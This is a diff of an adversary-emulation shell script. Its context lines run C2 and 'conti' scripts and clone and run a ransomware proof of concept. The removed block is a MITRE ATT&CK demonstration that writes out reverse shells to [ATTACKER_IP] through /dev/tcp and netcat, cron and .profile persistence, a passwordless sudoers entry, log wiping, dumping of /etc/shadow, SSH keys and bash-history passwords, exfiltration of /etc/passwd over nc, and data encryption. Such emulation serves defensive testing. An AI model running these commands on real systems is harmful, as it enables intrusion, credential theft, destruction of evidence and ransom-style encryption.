@@ -85,7 +85,7 @@ sleep 3
 # Make Executable 
 echo "[+] Changing C2 Client file permissions: executable" 
 chmod +x c2.sh
-sleep 
+sleep 1
 
 # Exectuion of Malware and Handlening 
 echo "[+] callin malware executables"
@@ -93,88 +93,12 @@ echo "[+] callin malware executables"
 conti.sh || true 
 c2.sh || true 
 
+### Ransowmare 
 git clone https://github.com/jimmy-ly00/Ransomware-PoC
 cd /Ransomware-POC 
 pip3 install pycroptodome 
 Encrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -e
 Decrypt: python3 main_v2.py -p "/home/jimmy/test_ransomware" -d
-### Ransowmare 
-
-
-# MITRE ATT&CK TTP Demonstration Script
-# === Initial Access and Execution ===
-echo "[*] Attempting SSH Access..."
-ssh user@localhost || echo "[!] SSH failed - Continuing..."
-
-echo "[*] Creating reverse shell..."
-bash -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1 || echo "[!] Reverse shell failed - Continuing..."
-
-# === Persistence ===
-echo "[*] Adding a cron job for persistence..."
-echo "* * * * * root /bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> /etc/crontabs/root
-
-echo "[*] Adding a malicious script to .profile..."
-echo "/bin/sh -i >& /dev/tcp/[ATTACKER_IP]/[PORT] 0>&1" >> ~/.profile
-
-# === Privilege Escalation ===
-echo "[*] Modifying sudoers file for privilege escalation..."
-echo 'user ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers
-
-echo "[*] Switching to root user..."
-sudo su - || echo "[!] Failed to switch to root - Continuing..."
-
-# === Defense Evasion ===
-echo "[*] Removing log files..."
-rm -rf /var/log/*
-
-echo "[*] Changing permissions for /etc/shadow to hide from non-root users..."
-chmod 600 /etc/shadow
-
-# === Credential Access ===
-echo "[*] Dumping /etc/shadow for credential access..."
-cat /etc/shadow || echo "[!] Failed to read /etc/shadow - Continuing..."
-
-echo "[*] Extracting saved credentials from .bash_history..."
-cat ~/.bash_history | grep password
-
-# === Discovery ===
-echo "[*] Gathering system information..."
-uname -a
-
-echo "[*] Checking network interfaces..."
-ifconfig -a
-
-echo "[*] Listing running processes..."
-ps aux
-
-echo "[*] Listing contents of critical directories..."
-ls -alh /etc
-
-# === Lateral Movement ===
-echo "[*] Attempting SSH to target machine..."
-ssh user@target-machine || echo "[!] SSH to target failed - Continuing..."
-
-# === Collection ===
-echo "[*] Reading SSH keys..."
-cat ~/.ssh/id_rsa
-
-echo "[*] Archiving files for exfiltration..."
-tar -czvf collected_data.tar.gz /etc /home
-
-echo "[*] Creating reverse shell using netcat..."
-nc -e /bin/sh [ATTACKER_IP] [PORT]
-
-# === Exfiltration ===
-echo "[*] Exfiltrating /etc/passwd..."
-cat /etc/passwd | nc [ATTACKER_IP] [PORT]
-
-# === Impact ===
-echo "[*] Disabling SSH service..."
-service sshd stop || echo "[!] Failed to stop SSH service - Continuing..."
-
-echo "[*] Encrypting sensitive data..."
-tar -cf sensitive_data.tar /important_dir && openssl enc -aes-256-cbc -salt -in sensitive_data.tar -out sensitive_data.tar.enc -k [PASSWORD]
-
 
 ### Network Scanning Local 
 ### Nmap > Local Scanning > Recon List 
